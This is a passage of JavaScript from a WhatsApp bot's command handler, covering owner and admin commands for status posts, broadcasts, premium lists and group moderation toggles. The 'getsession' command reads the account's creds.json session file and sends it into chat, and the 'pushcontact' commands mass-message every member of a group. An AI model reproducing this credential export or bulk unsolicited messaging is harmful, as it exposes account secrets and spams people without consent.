                  reply(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
               }
            }
            break
            case 'statustext': 
            case 'upswteks': {
               if (!isSamu) return StickOwner()
               if (!q) return reply('Text?')
               await nyanBot2.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               reply(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!isSamu) return StickOwner()
               if (/video/.test(mime)) {
                  var videosw = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                  await nyanBot2.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await reply(mess.done)
               } else {
                  reply('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!isSamu) return StickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                  await nyanBot2.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await reply(mess.done)
               } else {
                  reply('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!isSamu) return StickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                  await nyanBot2.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await reply(mess.done)
               } else {
                  reply('Reply to audio')
               }
            }
            break
            case 'setimgmenu':
            case 'sim': {
                if (!isSamu) return StickOwner()
                let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './Media/theme/nyancat.jpg')
                fs.unlinkSync(delb)
                reply(mess.done)
            }
            break
            case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!isSamu) return StickOwner()
                let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './Media/theme/Cheems-bot.mp4')
                fs.unlinkSync(delb)
                reply(mess.done)
            }
            break
            case 'addtitle':{
               if (!isSamu) return StickOwner()
               if (!text) return reply(`Usage ${prefix + command} number|title`)
               nonya = text.split('|')[0]
               titlenya = text.split('|')[1]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = titlenya
               await reply(mess.done)
            }
            break
            case 'deltitle':{
               if (!isSamu) return StickOwner()
               if (!text) return reply(`Usage ${prefix + command} number`)
               nonya = text.split(',')[0]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = ''
               await reply(mess.done)
            }
            break
            case 'addlimit':
            case 'givelimit':{
                if (!isSamu) return StickOwner()
                if (!text) return reply(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                db.data.users[oo].limit += limitnya
                reply(mess.done)
            }
            break
            case 'dellimit':{
                if (!isSamu) return StickOwner()
                if (!text) return reply(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return reply(`His Limit Is Less Than ${limitnya}`)
                db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
                reply(mess.done)
            }
            break
            case 'addprem':
                if (!isSamu) return StickOwner()
                if (args.length < 2)
                    return reply(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    reply("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    reply("Premium Success")
                }
            break
            case 'delprem':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 916909137213`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    }
                    reply("Delete Success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    reply("Delete Success")
                }
            break
            case 'listprem': {
                if (!isSamu) return StickOwner()
                let data = require('./src/data/role/premium.json')
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let x of data) {
                    txt += `Number : ${x.id}\n`
                    txt += `Expire In: ${x.expired} ms\n`
                nyanBot2.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'addowner':
if (!isSamu) return StickOwner()
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await nyanBot2.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
reply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!isSamu) return StickOwner()
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
reply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                reply(teks)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!isSamu) return StickOwner()
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    reply(teks)
                    await sleep(2000)
                    reply("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isSamu) return StickOwner()
                    if (!text) return reply('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    nyanBot2.groupAcceptInvite(result)
                    await reply(`Done`)
                } catch {
                    reply('Failed to join the Group')
                }
                break
            case 'getsession':
                if (!isSamu) return StickOwner()
                reply('Wait a moment, currently retrieving your session file')
                let sesi = fs.readFileSync('./session/creds.json')
                nyanBot2.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'myip':
            case 'ipbot':
                if (!isSamu) return StickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
	if (!text) return reply(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                nyanBot2.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            nyanBot2.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
            case 'shutdown':
                if (!isSamu) return StickOwner()
                reply(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
            break
            case 'autoread':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    reply(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    reply(`Successfully changed autoread to ${q}`)
                }
            break
            case 'unavailable':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    reply(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    reply(`Successfully changed unavailable to ${q}`)
                }
            break
            case 'autorecordtype':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecordtype = true
                    reply(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
                    reply(`Successfully changed Auto-RecordingTyping to ${q}`)
                }
            break
            case 'autorecord':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    reply(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    reply(`Successfully changed Auto-Recording to ${q}`)
                }
            break
            case 'autotype':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    reply(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    reply(`Successfully changed Auto-Typing to ${q}`)
                }
            break
            case 'autobio':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
            break
            case 'autosticker': case 'autostickergc':
                if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autosticker = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autosticker = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
            break
            case 'autoblock':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    reply(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    reply(`Successfully Changed Auto-Block To ${q}`)
                }
            break
            case 'onlygroup':
            case 'onlygc':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    reply(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    reply(`Successfully Changed Onlygroup To ${q}`)
                }
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    reply(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    reply(`Successfully Changed Only-Pc To ${q}`)
                }
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindia = true
                    reply(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindia = false
                    reply(`Successfully Changed Only-Indian To ${q}`)
                }
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindo = true
                    reply(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindo = false
                    reply(`Successfully Changed Only-Indonesian To ${q}`)
                }
            break
            case 'self': {
                if (!isSamu) return StickOwner()
                nyanBot2.public = false
                reply('*Successful in Changing To Self Usage*')
            }
            break
            case 'public': {
                if (!isSamu) return StickOwner()
                nyanBot2.public = true
                reply('*Successful in Changing To Public Usage*')
            }
            break
            case 'mode':
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    nyanBot2.public = true
                    reply(mess.done)
                } else if (q == 'self') {
                    nyanBot2.public = false
                    reply(mess.done)
                }
            break
            case 'setexif':
            case 'setwm':
                if (!isSamu) return StickOwner()
                if (!text) return reply(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                reply(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
                case 'setprefix':
                if (!isSamu) return StickOwner()
                if (!text) return reply(`Example : ${prefix + command} packname|author`)
                global.xprefix = text
                reply(`Prefix successfully changed to ${text}`)
                break
                case 'setautoblock':
                if (!isSamu) return StickOwner()
                if (!text) return reply(`Example : ${prefix + command} packname|author`)
                global.autoblocknumber = text
                reply(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!isSamu) return StickOwner()
                if (!text) return reply(`Example : ${prefix + command} packname|author`)
                global.antiforeignnumber = text
                reply(`Anti-foreign number successfully changed to ${text}`)
                break
            case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isSamu) return StickOwner()
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await nyanBot2.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await nyanBot2.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await nyanBot2.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
            case 'leave':
            case 'out':
                if (!isSamu) return StickOwner()
                if (!m.isGroup) return StickGroup()
                reply('Bye Everyone 🥺')
                await nyanBot2.groupLeave(m.chat)
            break
            case 'bc':
            case 'broadcast': {
               if (!isSamu) return StickOwner()
               if (!text) return reply('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await nyanBot2.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await nyanBot2.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await nyanBot2.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               reply(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
            }
            break
            case 'pushcontact': {
    if (!isSamu) return StickOwner()
      if (!m.isGroup) return reply(`The feature works only in grup`)
    if (!text) return reply(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    reply(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    nyanBot2.sendMessage(pler, { text: q})
     }  
     reply(`Done`)
      }
      break
case "pushcontactv2":{
if (!isSamu) return StickOwner()
if (!q) return reply(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
await StickWait()
const metadata2 = await nyanBot2.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
nyanBot2.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
reply(`Success`)
}
break
case 'block': case 'ban': {
		if (!isSamu) return StickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await nyanBot2.updateBlockStatus(users, 'block')
		await reply(`Done`)
	}
	break
	case 'unblock': case 'unban': {
		if (!isSamu) return StickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await nyanBot2.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break
            case 'bcgc':
            case 'bcgroup': {
                if (!isSamu) return StickOwner()
                if (!text) return reply(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await nyanBot2.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    nyanBot2.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                reply(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isSamu) return StickOwner()
                try {
                   const getCase = (cases) => {
                      return "case" + `'${cases}'` + fs.readFileSync("XeonCheems10.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   reply(`${getCase(q)}`)
                } catch {
                  reply(`case ${q} not found!`)
                }
            break
            //group
            case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].badword = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].badword = false
                  reply(`${commad} is disabled`)
               }
               }
            break
            case 'react': {
                if (!isSamu) return StickOwner()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                nyanBot2.sendMessage(m.chat, reactionMessage)
            }
            break
           case 'nsfw': {
if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return reply('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
reply('Success in turning on nsfw in this group')
var groupe = await nyanBot2.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
nyanBot2.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return reply('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
reply('Success in turning off nsfw in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'id':{
            reply(from)
           }
          break
            case 'antiaudio':{
            	if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiaudio = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiaudio = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antiforeign':{
            	if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[m.chat].antiforeignnum = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[m.chat].antiforeignnum = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'poll': {
	if (!isSamu) return StickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await reply(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await nyanBot2.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
            case 'antipoll':{
            	if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antipoll = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipoll = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antisticker = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antisticker = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiimage = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiimage = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivideo = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivideo = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antivirtex':{
		         if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivirtex = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivirtex = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antibot':{
		         if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antibot = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antibot = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antiviewonce':{
		         if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiviewonce = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiviewonce = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antimedia = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antimedia = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antidocument = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antidocument = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].anticontact = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].anticontact = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilocation = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilocation = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antilink': {
               if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  reply(`${command} is disabled`)
               }
            }
            break
            case 'antilinkgc': {
               if (!m.isGroup) return StickGroup()
if (!isBotAdmins) return StickBotAdmin()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  reply(`${command} is disabled`)
               }
            }
            break
            case 'welcome':
            case 'left': {
               if (!m.isGroup) return StickGroup()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  welcome = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  welcome = false
                  reply(`${command} is disabled`)
               }
            }
            break
            case 'adminevent': {
               if (!m.isGroup) return StickGroup()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  adminevent = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  adminevent = false
                  reply(`${command} is disabled`)
               }
            }
            break
case 'groupevent': {
               if (!m.isGroup) return StickGroup()
if (!isAdmins && !isSamu) return StickAdmin()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  groupevent = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  groupevent = false
                  reply(`${command} is disabled`)
               }
            }
            break 
            case 'invite': {
	if (!m.isGroup) return StickGroup()
	if (!isBotAdmins) return StickBotAdmin()
if (!text) return reply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
if (text.includes('+')) return reply(`Enter the number together without *+*`)
if (isNaN(text)) return reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await nyanBot2.groupInviteCode(group)
      await nyanBot2.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        reply(` An invite link is sent to the user`) 
}
break
            case 'closetime':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
